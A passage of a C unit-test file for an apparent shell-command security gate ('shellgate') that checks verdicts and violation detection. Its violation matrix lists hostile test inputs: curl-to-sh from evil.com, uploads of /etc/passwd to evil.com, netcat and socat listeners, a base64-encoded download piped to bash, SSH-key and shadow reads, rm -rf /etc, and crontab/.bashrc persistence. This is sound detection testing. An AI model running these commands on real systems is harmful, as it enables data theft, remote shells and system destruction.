  for (size_t i = 0; i < sizeof(sources) / sizeof(sources[0]); i++) {
    char command[256];
    snprintf(command, sizeof(command),
             "exec {fd}>out || exit; %s unset fd; printf x >&\"$fd\"",
             sources[i]);
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, command, &result));
    if (result.verdict != SG_VERDICT_ALLOW) {
      fprintf(stderr, "resolved builtin evaluation: %s (verdict=%d)\n", command,
              result.verdict);
      for (uint32_t j = 0; j < result.subcommand_count; j++)
        fprintf(stderr, "  netargv=%s verdict=%d\n",
                result.subcommands[j].netargv, result.subcommands[j].verdict);
    }
    ASSERT_EQ_INT(result.verdict, SG_VERDICT_ALLOW);
  }
  sg_gate_free(gate);
}

TEST(exit_outcome_evaluation) {
  static const char *const rules[] = {
      "exit",           "exit *",   "exit -- *",  "command exit -- *",
      "builtin exit *", "true",     "false",      "probe",
      "exec",           "unset fd", "printf x",   "echo *",
      "printf nested",  "printf *", "printf * *", "cat"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_suggestions(gate, false));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  static const char *const unreachable[] = {
      "exit 2; printf x >&\"$fd\"",
      "exit -1; printf x >out",
      "command exit -- 256; printf x >out",
      "builtin exit +0; echo \"$(printf nested)\"",
      "(false; exit) && echo \"$(printf nested)\"",
      "false; (exit) && printf x >&\"$fd\"",
      "(exit 256) || printf x >out",
      "(exit -- -1) && printf x >out",
      "false; ({ exit; }) && printf x >out",
      "true; ({(exit)}) || printf x >out",
  };
  for (size_t i = 0; i < sizeof(unreachable) / sizeof(unreachable[0]); i++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, unreachable[i], &result));
    if (result.verdict != SG_VERDICT_ALLOW)
      fprintf(stderr, "exit evaluation: %s (verdict=%d)\n", unreachable[i],
              result.verdict);
    ASSERT_EQ_INT(result.verdict, SG_VERDICT_ALLOW);
    ASSERT(!result.has_dynamic_substitution_io &&
           !result.requires_substitution_evaluation);
    for (uint32_t command = 0; command < result.subcommand_count; command++)
      ASSERT(result.subcommands[command].write_count == 0 &&
             !result.subcommands[command].requires_substitution_evaluation);
  }
  static const struct {
    const char *prefix;
    sg_verdict_t verdict;
  } retained[] = {
      {"(false; exit) &&", SG_VERDICT_ALLOW},
      {"(true; exit) ||", SG_VERDICT_ALLOW},
      {"(false; exit <<< <(printf '%s' \"$(true)\")) &&",
       SG_VERDICT_ALLOW_CONDITIONAL},
      {"(true; exit <<< <(printf '%s' \"$(false)\")) ||",
       SG_VERDICT_ALLOW_CONDITIONAL},
      {"(probe && exit; true) ||", SG_VERDICT_ALLOW},
      {"(probe || exit; false) &&", SG_VERDICT_ALLOW},
      {"(exit -- 256) ||", SG_VERDICT_ALLOW},
      {"(exit -1) &&", SG_VERDICT_ALLOW},
  };
  for (size_t i = 0; i < sizeof(retained) / sizeof(retained[0]); i++) {
    char source[256];
    snprintf(source, sizeof(source),
             "exec {fd}>out || exit; %s unset fd; printf x >&\"$fd\"",
             retained[i].prefix);
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, source, &result));
    if (result.verdict != retained[i].verdict)
      fprintf(stderr, "exit route verdict: %s (verdict=%d inspection=%d)\n",
              source, result.verdict, result.requires_substitution_evaluation);
    ASSERT_EQ_INT(result.verdict, retained[i].verdict);
    if (!result.subcommand_count ||
        result.subcommands[result.subcommand_count - 1].write_count != 1) {
      fprintf(stderr, "exit route evaluation: %s (commands=%u)\n", source,
              result.subcommand_count);
      for (uint32_t command = 0; command < result.subcommand_count; command++)
        fprintf(stderr, "  %s writes=%u\n", result.subcommands[command].netargv,
                result.subcommands[command].write_count);
    }
    ASSERT(result.subcommand_count > 0 &&
           result.subcommands[result.subcommand_count - 1].write_count == 1);
  }
  sg_gate_free(gate);
}

TEST(graph_analysis_scaling) {
  static const char *const rules[] = {"printf *", "cat *"};
  sg_gate_t *gate = gate_with_rules(rules, 2);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/never-match";
  config.sensitive_write_path_count = 1;
  config.sensitive_read_paths[0] = "/never-match";
  config.sensitive_read_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));

  size_t previous_work = 0;
  for (unsigned count = 4; count <= 16; count *= 2) {
    char command[8192];
    size_t used = 0;
    for (unsigned i = 0; i < count; i++) {
      int written =
          snprintf(command + used, sizeof(command) - used,
                   "{ printf x >file%u; cat ./file%u; } >group%u; ", i, i, i);
      ASSERT(written > 0 && (size_t)written < sizeof(command) - used);
      used += (size_t)written;
    }
    shellsplit_test_source_scan_reset();
    sg_result_t result;
    sg_error_t eval_status = eval_cmd(gate, command, &result);
    if (eval_status != SG_OK)
      fprintf(stderr, "graph scaling evaluation failed: count=%u status=%d\n",
              count, eval_status);
    ASSERT(eval_status == SG_OK);
    size_t work =
        shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_GATE_EDGES) +
        shellsplit_test_metadata_work(
            SHELLSPLIT_TEST_WORK_GATE_VIOLATION_INDEX);
    ASSERT(work > 0 && work <= 256 * count &&
           (!previous_work || work <= (5 * previous_work) / 2));
    ASSERT(result.subcommand_count == 2 * count);
    ASSERT((result.violation_type_flags & SG_VIOL_WRITE_THEN_READ) != 0);
    previous_work = work;
  }

  /* Reads that all precede writes to the same canonical path must not
   * produce a write-then-read finding. This also stresses the negative case
   * where every output shares a path bucket with every read candidate. */
  previous_work = 0;
  for (unsigned count = 4; count <= 16; count *= 2) {
    char command[8192];
    size_t used = 0;
    for (unsigned i = 0; i < count; i++) {
      int written =
          snprintf(command + used, sizeof(command) - used, "cat ./shared; ");
      ASSERT(written > 0 && (size_t)written < sizeof(command) - used);
      used += (size_t)written;
    }
    for (unsigned i = 0; i < count; i++) {
      int written = snprintf(command + used, sizeof(command) - used,
                             "printf x >./shared; ");
      ASSERT(written > 0 && (size_t)written < sizeof(command) - used);
      used += (size_t)written;
    }
    shellsplit_test_source_scan_reset();
    sg_result_t result;
    sg_error_t eval_status = eval_cmd(gate, command, &result);
    ASSERT(eval_status == SG_OK);
    size_t work =
        shellsplit_test_metadata_work(SHELLSPLIT_TEST_WORK_GATE_EDGES) +
        shellsplit_test_metadata_work(
            SHELLSPLIT_TEST_WORK_GATE_VIOLATION_INDEX);
    ASSERT(work > 0 && work <= 256 * count &&
           (!previous_work || work <= 3 * previous_work));
    ASSERT(result.subcommand_count == 2 * count);
    ASSERT((result.violation_type_flags & SG_VIOL_WRITE_THEN_READ) == 0);
    previous_work = work;
  }
  sg_gate_free(gate);
}

TEST(optional_violation_index_and_compound_completion) {
  static const char *const rules[] = {"printf *", "cat *", "cd *"};
  sg_gate_t *gate = gate_with_rules(rules, 3);
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result;
  shellsplit_test_source_scan_reset();
  ASSERT_SG_OK(eval_cmd(gate, "{ printf x >out; }; cat ./out", &result));
  ASSERT(shellsplit_test_metadata_work(
             SHELLSPLIT_TEST_WORK_GATE_VIOLATION_INDEX) == 0);
  ASSERT(result.verdict == SG_VERDICT_ALLOW);
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  static const struct {
    const char *source;
    bool write_then_read;
  } cases[] = {{"{ printf x >out; }; cat ./out", true},
               {"{ { printf x >out; }; }; cat ./out", true},
               {"{ printf x >out; cd /tmp; }; cat ./out", false},
               {"{ cat ./out; printf x >out; }", false},
               {"{ { cat ./out; }; printf x >out; }", false},
               {"{ printf x >out; { cat ./out; }; }", true}};
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    shellsplit_test_source_scan_reset();
    ASSERT_SG_OK(eval_cmd(gate, cases[i].source, &result));
    ASSERT(shellsplit_test_metadata_work(
               SHELLSPLIT_TEST_WORK_GATE_VIOLATION_INDEX) > 0);
    if (((result.violation_type_flags & SG_VIOL_WRITE_THEN_READ) != 0) !=
        cases[i].write_then_read)
      fprintf(stderr, "completion case %zu: %s flags=%u\n", i, cases[i].source,
              result.violation_type_flags);
    ASSERT(((result.violation_type_flags & SG_VIOL_WRITE_THEN_READ) != 0) ==
           cases[i].write_then_read);
  }
  sg_gate_free(gate);
}

TEST(violation_rule_matrix) {
  static const violation_case_t cases[] = {
      {"sensitive write", "echo hello > /etc/badfile",
       "echo hello > /tmp/out.txt", SG_VIOL_WRITE_SENSITIVE, 1, "/etc"},
      {"quoted sensitive write", "echo hello > /e\"tc\"/badfile",
       "echo hello > /e\"tc-old\"/badfile", SG_VIOL_WRITE_SENSITIVE, 1,
       "badfile"},
      {"ANSI-C sensitive write", "echo hello > $'\\x2fetc\\x2fbadfile'",
       "echo hello > $'\\x2ftmp\\x2fout.txt'", SG_VIOL_WRITE_SENSITIVE, 1,
       "badfile"},
      {"system removal", "rm -rf /etc", "rm /tmp/junk", SG_VIOL_REMOVE_SYSTEM,
       90, NULL},
      {"path-qualified system removal", "/usr/bin/rm -rf /etc",
       "/usr/bin/rmx -rf /etc", SG_VIOL_REMOVE_SYSTEM, 90, NULL},
      {"ANSI-C system removal", "rm -rf $'\\x2fetc'", "rm -rf $'\\x2ftmp'",
       SG_VIOL_REMOVE_SYSTEM, 90, NULL},
      {"privileged environment", "LD_PRELOAD=mal.so sudo ls", "FOO=bar ls",
       SG_VIOL_ENV_PRIVILEGED, 80, ""},
      {"privileged environment alternate defaults", "IFS=malicious passwd",
       "FOO=benign passwd", SG_VIOL_ENV_PRIVILEGED, 80, "IFS"},
      {"write/read semicolon", "cat /etc/passwd > /tmp/x ; cat /tmp/x",
       "echo hello > /tmp/x ; ls /tmp", SG_VIOL_WRITE_THEN_READ, 1, NULL},
      {"write/read and", "echo test > /tmp/x && cat /tmp/x", NULL,
       SG_VIOL_WRITE_THEN_READ, 1, NULL},
      {"write/read or", "echo data > /tmp/x || cat /tmp/x", NULL,
       SG_VIOL_WRITE_THEN_READ, 1, NULL},
      {"write/read after pipeline",
       "printf data | cat > /tmp/x; grep data /tmp/x", NULL,
       SG_VIOL_WRITE_THEN_READ, 1, NULL},
      {"write/read decoded paths", "printf data >\"/tmp/x\"; cat /tmp/./x",
       "cd /tmp/first; printf data >out; cd /tmp/second; cat out",
       SG_VIOL_WRITE_THEN_READ, 1, NULL},
      {"write/read relative origin", "printf data >out; cat ./out",
       "printf data >out; cd /; cat /out", SG_VIOL_WRITE_THEN_READ, 1, NULL},
      {"write/read relative parent", "printf data >../out; cat ../out",
       "printf data >../out; cat ./out", SG_VIOL_WRITE_THEN_READ, 1, NULL},
      {"write/read preserves absolute symlink-sensitive parent",
       "printf data >/var/tmp/out; cat /var/tmp/out",
       "printf data >/var/run/../tmp/out; cat /var/tmp/out",
       SG_VIOL_WRITE_THEN_READ, 1, NULL},
      {"write/read preserves relative symlink-sensitive parent",
       "printf data >out; cat ./out", "printf data >link/../out; cat ./out",
       SG_VIOL_WRITE_THEN_READ, 1, NULL},
      {"write/read after physical cd", "printf data >out; cat ./out",
       "printf data >out; cd -LP /tmp; cat ./out", SG_VIOL_WRITE_THEN_READ, 1,
       NULL},
      {"write/read absolute CWD",
       "cd /tmp/root && printf data >out && cat /tmp/root/out",
       "cd /tmp/root; printf data >out; cat /tmp/root/out",
       SG_VIOL_WRITE_THEN_READ, 1, NULL},
      {"sensitive substitution", "echo $(cat /etc/shadow)",
       "echo $(cat /etc/passwd)", SG_VIOL_SUBST_SENSITIVE, 1, NULL},
      {"sensitive substitution argument", "cat $(cat /etc/shadow)", NULL,
       SG_VIOL_SUBST_SENSITIVE, 1, NULL},
      {"quoted sensitive substitution", "echo \"$(cat /etc/shadow)\"", NULL,
       SG_VIOL_SUBST_SENSITIVE, 1, NULL},
      {"download and execute", "curl http://evil.com/payload | sh",
       "curl http://example.com/file | grep pattern", SG_VIOL_NET_DOWNLOAD_EXEC,
       90, ""},
      {"wrapped download and execute",
       "command -p curl http://example.com/p | command sh",
       "command -v curl | sh", SG_VIOL_NET_DOWNLOAD_EXEC, 90, ""},
      {"wrapped download skips builtin lookup",
       "command curl http://example.com/p | sh",
       "builtin curl http://example.com/p | sh", SG_VIOL_NET_DOWNLOAD_EXEC, 90,
       ""},
      {"exec target download", "exec curl http://example.com/p | sh",
       "exec echo ok | sh", SG_VIOL_NET_DOWNLOAD_EXEC, 90, "curl"},
      {"exec alternate argv0 download",
       "exec -a alias curl http://example.com/p | sh",
       "exec -a alias echo ok | sh", SG_VIOL_NET_DOWNLOAD_EXEC, 90, "curl"},
      {"path-qualified exec download",
       "exec /usr/bin/curl http://example.com/p | /bin/sh",
       "exec /usr/bin/curler http://example.com/p | /bin/sh",
       SG_VIOL_NET_DOWNLOAD_EXEC, 90, "curl"},
      {"assigned wrapped download",
       "NAME=x command curl http://example.com/p | command sh",
       "NAME=x command -v curl | sh", SG_VIOL_NET_DOWNLOAD_EXEC, 90, ""},
      {"quoted download and executor", "c'url' http://example.com/p | s'h'",
       "\"$download\" http://example.com/p | sh", SG_VIOL_NET_DOWNLOAD_EXEC, 90,
       ""},
      {"ANSI-C download and executor",
       "$'\\x63url' http://example.com/p | $'\\x73h'", NULL,
       SG_VIOL_NET_DOWNLOAD_EXEC, 90, ""},
      {"download into group", "curl http://example.com/p | { sh; }",
       "curl http://example.com/p | { sh </dev/null; }",
       SG_VIOL_NET_DOWNLOAD_EXEC, 90, ""},
      {"group download into executor", "{ curl http://example.com/p; } | sh",
       "{ curl http://example.com/p >/tmp/out; } | sh",
       SG_VIOL_NET_DOWNLOAD_EXEC, 90, ""},
      {"nested group download into executor",
       "{ { curl http://example.com/p; }; } | { { sh; }; }", NULL,
       SG_VIOL_NET_DOWNLOAD_EXEC, 90, ""},
      {"nested substitution download into executor",
       "echo \"$(curl http://example.com/p | sh)\"", NULL,
       SG_VIOL_NET_DOWNLOAD_EXEC, 90, ""},
      {"download and execute alternate defaults", "wget https://evil/p | node",
       NULL, SG_VIOL_NET_DOWNLOAD_EXEC, 90, "node"},
      {"recursive system chmod", "chmod -R 777 /etc",
       "chmod 644 /etc/resolv.conf", SG_VIOL_PERM_SYSTEM, 80, NULL},
      {"wrapped recursive system chmod", "command chmod -R 777 /etc",
       "command chmod 644 /etc/resolv.conf", SG_VIOL_PERM_SYSTEM, 80, NULL},
      {"quoted recursive chmod", "ch'mod' '-R' 777 /etc",
       "ch'mod' 644 /etc/resolv.conf", SG_VIOL_PERM_SYSTEM, 80, NULL},
      {"recursive system group change", "chgrp -R root /etc",
       "chgrp root /tmp/file", SG_VIOL_PERM_SYSTEM, 80, "/etc"},
      {"shell escalation", "sudo bash", "sudo ls", SG_VIOL_SHELL_ESCALATION, 80,
       ""},
      {"path-qualified shell escalation", "/usr/bin/sudo /bin/bash",
       "/usr/bin/sudox /bin/bash", SG_VIOL_SHELL_ESCALATION, 80, "sudo"},
      {"wrapped shell escalation", "command sudo bash", "command sudo ls",
       SG_VIOL_SHELL_ESCALATION, 80, ""},
      {"shell escalation after sudo options", "sudo -u root /bin/bash",
       "sudo -u root ls", SG_VIOL_SHELL_ESCALATION, 80, "sudo"},
      {"shell escalation after sudo separator", "sudo -- /bin/bash",
       "sudo -- ls", SG_VIOL_SHELL_ESCALATION, 80, "sudo"},
      {"shell escalation via su shell", "su -s /bin/bash root", "su sh",
       SG_VIOL_SHELL_ESCALATION, 80, "su"},
      {"shell escalation via su command", "su -c id root", "su root",
       SG_VIOL_SHELL_ESCALATION, 80, "su"},
      {"shell escalation via su long command", "su --command=id root", NULL,
       SG_VIOL_SHELL_ESCALATION, 80, "su"},
      {"shell escalation via dynamic su command",
       "su --command=\"$payload\" root", "su root", SG_VIOL_SHELL_ESCALATION,
       80, "su"},
      {"shell escalation via su long shell", "su --shell=/bin/bash root",
       "su --shell=/bin/false root", SG_VIOL_SHELL_ESCALATION, 80, "su"},
      {"shell escalation via su attached shell", "su -s/bin/bash root",
       "su -s/bin/false root", SG_VIOL_SHELL_ESCALATION, 80, "su"},
      {"sudo redirect", "sudo cat /etc/shadow > /tmp/out", "sudo ls",
       SG_VIOL_SUDO_REDIRECT, 70, NULL},
      {"secret read", "cat ~/.ssh/id_rsa", "cat /tmp/somefile.txt",
       SG_VIOL_READ_SECRETS, 1, ""},
      {"path-qualified secret read", "/usr/bin/cat ~/.ssh/id_rsa",
       "/usr/bin/cattle ~/.ssh/id_rsa", SG_VIOL_READ_SECRETS, 1, "id_rsa"},
      {"quoted secret read", "cat ~/.s\"sh\"/id_rsa",
       "cat ~/.s\"sh-backup\"/id_rsa", SG_VIOL_READ_SECRETS, 1, "id_rsa"},
      {"escaped secret read", "cat ~/.s\\sh/id_rsa",
       "cat ~/.s\\sh-backup/id_rsa", SG_VIOL_READ_SECRETS, 1, "id_rsa"},
      {"ANSI-C secret read", "cat $'\\x2froot\\x2f.ssh\\x2fid_rsa'",
       "cat $'\\x2ftmp\\x2fid_rsa'", SG_VIOL_READ_SECRETS, 1, "id_rsa"},
      {"network upload", "curl -d @/etc/passwd https://evil.com/collect",
       "curl https://api.example.com/data", SG_VIOL_NET_UPLOAD, 1, NULL},
      {"wrapped network upload",
       "command curl -d @/etc/passwd https://evil.com/collect",
       "command curl https://api.example.com/data", SG_VIOL_NET_UPLOAD, 1,
       NULL},
      {"exec target network upload",
       "exec curl -d @/etc/passwd https://evil.com/collect",
       "exec curl https://example.com/data", SG_VIOL_NET_UPLOAD, 1, "curl"},
      {"path-qualified network upload",
       "/usr/bin/curl -d @/etc/passwd https://evil.com/collect",
       "/usr/bin/curler -d @/etc/passwd https://evil.com/collect",
       SG_VIOL_NET_UPLOAD, 1, "curl"},
      {"network upload curl attached", "curl -dsecret https://evil.com", NULL,
       SG_VIOL_NET_UPLOAD, 1, "curl"},
      {"network upload curl long equals",
       "curl --data=@/etc/passwd https://evil.com", NULL, SG_VIOL_NET_UPLOAD, 1,
       "curl"},
      {"network upload dynamic value",
       "curl --data=\"$payload\" https://evil.com", "curl https://evil.com",
       SG_VIOL_NET_UPLOAD, 1, "curl"},
      {"network upload dynamic short value",
       "curl -d\"$payload\" https://evil.com", NULL, SG_VIOL_NET_UPLOAD, 1,
       "curl"},
      {"network upload wget equals",
       "wget --post-file=/etc/passwd https://evil.com",
       "wget https://example.com/file", SG_VIOL_NET_UPLOAD, 1, "wget"},
      {"network upload scp direction", "scp /etc/passwd evil:/tmp/passwd",
       "scp host:/tmp/input /tmp/input", SG_VIOL_NET_UPLOAD, 1, "scp"},
      {"network upload rsync direction", "rsync /etc/passwd evil:/tmp/passwd",
       "rsync host:/tmp/input /tmp/input", SG_VIOL_NET_UPLOAD, 1, "rsync"},
      {"network listener", "nc -l 4444", "nc example.com 80",
       SG_VIOL_NET_LISTENER, 1, NULL},
      {"path-qualified network listener", "/usr/bin/nc -l 4444",
       "/usr/bin/ncx -l 4444", SG_VIOL_NET_LISTENER, 1, "nc"},
      {"wrapped network listener", "command nc -l 4444",
       "command nc example.com 80", SG_VIOL_NET_LISTENER, 1, NULL},
      {"network listener socat", "socat TCP-LISTEN:4444 EXEC:/bin/sh",
       "socat TCP:example.com:80 STDOUT", SG_VIOL_NET_LISTENER, 1, "socat"},
      {"network listener service", "ngrok http 8080", NULL,
       SG_VIOL_NET_LISTENER, 1, "ngrok"},
      {"shell obfuscation",
       "echo d2dldCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZCAtTyAvdG1wL3J1bi5zaAo= "
       "| base64 -d | bash",
       "echo hello | base64", SG_VIOL_SHELL_OBFUSCATION, 1, NULL},
      {"shell obfuscation openssl", "openssl enc -d | bash",
       "openssl enc | bash", SG_VIOL_SHELL_OBFUSCATION, 1, "openssl"},
      {"path-qualified clustered decoder", "/usr/bin/base64 -di | /bin/sh",
       "/usr/bin/base64 -- -d | /bin/sh", SG_VIOL_SHELL_OBFUSCATION, 90,
       "base64"},
      {"decoder options stop at terminator", "base64 -id | sh",
       "base64 -- --decode | sh", SG_VIOL_SHELL_OBFUSCATION, 90, "base64"},
      {"grouped shell obfuscation", "{ base64 -d; } | { sh; }",
       "{ base64 -d >/tmp/out; } | { sh; }", SG_VIOL_SHELL_OBFUSCATION, 90,
       "base64"},
      {"grouped shell obfuscation input redirect",
       "{ openssl enc -d; } | { bash; }",
       "{ openssl enc -d; } | { bash </dev/null; }", SG_VIOL_SHELL_OBFUSCATION,
       90, "openssl"},
      {"destructive git", "git push --force origin main",
       "git push origin feature-branch", SG_VIOL_GIT_DESTRUCTIVE, 1, NULL},
      {"path-qualified destructive git",
       "/usr/bin/git push --force origin main",
       "/usr/bin/gitx push --force origin main", SG_VIOL_GIT_DESTRUCTIVE, 1,
       "git"},
      {"wrapped destructive git", "command git push --force origin main",
       "command git push origin feature-branch", SG_VIOL_GIT_DESTRUCTIVE, 1,
       NULL},
      {"destructive git clean", "git clean -fdx", "git clean -n",
       SG_VIOL_GIT_DESTRUCTIVE, 1, "clean"},
      {"destructive git history", "git filter-branch -- --all", NULL,
       SG_VIOL_GIT_DESTRUCTIVE, 1, "filter-branch"},
      {"persistence", "echo '* * * * * /tmp/backdoor' | crontab", "crontab -l",
       SG_VIOL_PERSISTENCE, 1, NULL},
      {"path-qualified crontab", "/usr/bin/crontab /tmp/tab",
       "/usr/bin/crontabx /tmp/tab", SG_VIOL_PERSISTENCE, 1, "crontab"},
      {"persistence profile", "echo payload >> ~/.bashrc",
       "echo payload >> /tmp/output", SG_VIOL_PERSISTENCE, 1, ".bashrc"},
      {"builtin persistence profile", "builtin echo payload >~/.bashrc",
       "builtin echo payload >/tmp/out", SG_VIOL_PERSISTENCE, 1, ".bashrc"},
      {"dynamic persistence profile", "\"$runtime\" >~/.bashrc",
       "\"$runtime\" >/tmp/out", SG_VIOL_PERSISTENCE, 1, ".bashrc"},
      {"group persistence profile", "{ echo payload; } >~/.bashrc",
       "{ echo payload; } >/tmp/out", SG_VIOL_PERSISTENCE, 1, ".bashrc"},
      {"redirect-only persistence profile", ">~/.bashrc", ">/tmp/out",
       SG_VIOL_PERSISTENCE, 1, ".bashrc"},
      {"quoted persistence profile", "echo payload >> ~/.b\"ashrc\"",
       "echo payload >> ~/.b\"ash-profile\"", SG_VIOL_PERSISTENCE, 1, "ashrc"},
      {"escaped persistence profile", "echo payload >> ~/.b\\ashrc",
       "echo payload >> ~/.b\\ash-profile", SG_VIOL_PERSISTENCE, 1, "ashrc"},
  };

  sg_gate_t *gate = gate_with_violations();
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++)
    ASSERT(run_violation_case(gate, &cases[i]));
  sg_violation_config_t path_config;
  sg_violation_config_default(&path_config);
  path_config.download_cmds[0] = "/opt/bin/curl";
  path_config.download_cmd_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &path_config));
  const violation_case_t exact_path = {
      "configured executable path stays exact",
      "/opt/bin/curl http://example.com/p | sh",
      "/usr/bin/curl http://example.com/p | sh",
      SG_VIOL_NET_DOWNLOAD_EXEC,
      90,
      "curl",
  };
  ASSERT(run_violation_case(gate, &exact_path));
  sg_gate_free(gate);
}

/* Redirect setup changes filesystem state even where a later redirection
 * replaces its byte route. Shellgate must retain that side effect without
 * mistaking input setup or descriptor duplication for a write. */
TEST(descriptor_setup_dispatch) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/etc/dispatch-a";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  static const struct {
    const char *source, *netargv;
    uint32_t writes;
    bool sensitive;
  } cases[] = {
      {"exec 3>/etc/dispatch-a || exit; exec 10>&- 11>&- 12>&-; "
       "\"$cmd\" payload 1>&3 {fd}>&3 1>&10",
       "4:$cmd,7:payload,", 1, true},
      {"exec 3>/etc/dispatch-a || exit; exec 10>&- 11>&- 12>&-; "
       "command \"$cmd\" payload 1>&3 {fd}>&3 1>&10",
       "7:command,4:$cmd,7:payload,", 1, true},
      {"exec 3>/etc/dispatch-a || exit; exec 10>&- 11>&- 12>&-; "
       "builtin \"$cmd\" payload 1>&3 {fd}>&3 1>&10",
       "7:builtin,4:$cmd,7:payload,", 0, false},
      {"exec 3>&1 || exit; exec 10>&- 11>&- 12>&-; "
       "! 0<&0 1>&3 2>&10 && printf payload >/etc/dispatch-a",
       "6:printf,7:payload,", 1, true},
      {"exec 3>&1 || exit; exec 10>&- 11>&- 12>&-; "
       "0<&0 1>&3 2>&10 && printf payload >/etc/dispatch-a",
       "6:printf,7:payload,", 0, false},
      {"exec 3>&1 || exit; exec 10>&- 11>&- 12>&-; "
       "! 0<<<literal 1>&3 2>&10 && printf payload >/etc/dispatch-a",
       "6:printf,7:payload,", 1, true},
      {"exec 3>&1 || exit; exec 10>&- 11>&- 12>&-; "
       "! 0<<EOF 1>&3 2>&10 && printf payload >/etc/dispatch-a\nliteral\nEOF\n",
       "6:printf,7:payload,", 1, true},
      {"exec 1>/tmp/dispatch-original 4>/etc/dispatch-a || exit; "
       "exec 10>&- 11>&- 12>&-; : 1>&4- 12>&11- 1>&11; printf payload",
       "6:printf,7:payload,", 1, true},
      {"exec 1>/tmp/dispatch-original 4>/etc/dispatch-a || exit; "
       "exec 10>&- 11>&- 12>&-; { :; } 1>&4- 12>&11- 1>&11; printf payload",
       "6:printf,7:payload,", 1, true},
      {"exec 1>/tmp/dispatch-original 4>/etc/dispatch-a || exit; "
       "exec 10>&- 11>&- 12>&-; \"$cmd\" 1>&4- 12>&11- 1>&11; printf payload",
       "6:printf,7:payload,", 2, true},
      {"exec 1>/tmp/dispatch-original 4>/etc/dispatch-a || exit; "
       "exec 10>&- 11>&- 12>&-; /bin/true 1>&4- 12>&11- 1>&11; printf payload",
       "6:printf,7:payload,", 1, false},
      {"exec 1>/tmp/dispatch-original || exit; "
       "exec 9>&- 10>&- 11>&- 12>&-; "
       "{ echo \"$(exec 10>/etc/dispatch-a; printf payload >&10)\"; } "
       "1>/tmp/dispatch-temporary",
       "6:printf,7:payload,", 1, false},
      {"exec 1>/etc/dispatch-a || exit; "
       "exec 9>&- 10>&- 11>&- 12>&-; "
       "{ cat < <(exec 10>/tmp/dispatch-original; printf payload >&10); } "
       "1>/tmp/dispatch-temporary",
       "6:printf,7:payload,", 1, true},
      {"exec 1>/tmp/dispatch-original || exit; "
       "exec 9>&- 10>&- 11>&- 12>&-; "
       "{ : > >(exec 10>&-; exec 10>/etc/dispatch-a; printf payload >&10); } "
       "1>/tmp/dispatch-temporary",
       "6:printf,7:payload,", 1, true},
  };
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_result_t result = {0};
    ASSERT_SG_OK(sg_gate_evaluate(gate, cases[i].source,
                                  strlen(cases[i].source), eval_buf,
                                  sizeof(eval_buf), &result));
    bool found = false;
    for (uint32_t c = 0; c < result.subcommand_count; c++) {
      const sg_subcommand_result_t *command = &result.subcommands[c];
      if (strcmp(command->netargv, cases[i].netargv))
        continue;
      found = true;
      ASSERT(command->write_count == cases[i].writes);
      ASSERT(!!(command->violation_type_flags & SG_VIOL_WRITE_SENSITIVE) ==
             cases[i].sensitive);
    }
    ASSERT(found && !result.truncated);
  }
  sg_gate_free(gate);
}

TEST(descriptor_move_evaluation) {
  const char *rules[] = {
      "exec",  ":",           "echo *", "/bin/true",
      "probe", "printf next", "exit",   "builtin command /bin/true",
      "cat"};
  sg_gate_t *gate = gate_with_rules(rules, sizeof(rules) / sizeof(rules[0]));
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/etc/move-out";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  static const struct {
    const char *source;
    bool writes;
  } cases[] = {
      {"exec 3>/etc/move-out; exec 1>&3-; echo next", true},
      {"exec 4>&-; exec 3>/etc/move-out; : 4>&3-; echo next >&3", false},
      {"exec 3>/etc/move-out 4>&1; : 4>&3-; echo next >&3", true},
      {"exec 4>&-; exec 3>/etc/move-out; { :; } 4>&3-; echo next >&3", false},
      {"exec 3>/etc/move-out 4>&1; { :; } 4>&3-; echo next >&3", true},
      {"exec {fd}>/etc/move-out; exec 1>&${fd}-; echo next", true},
      {"exec 3>/etc/move-out; : 4>&\"3-\"; echo next >&3", true},
      {"exec 4>&-; exec 3>/etc/move-out; /bin/true 4>&3-; echo next >&3", true},
      {"exec 4>&-; exec 3>/etc/move-out; builtin command /bin/true 4>&3-; "
       "echo next >&3",
       false},
      {"exec 3>/etc/move-out || exit; builtin command /bin/true {fd}>&3; "
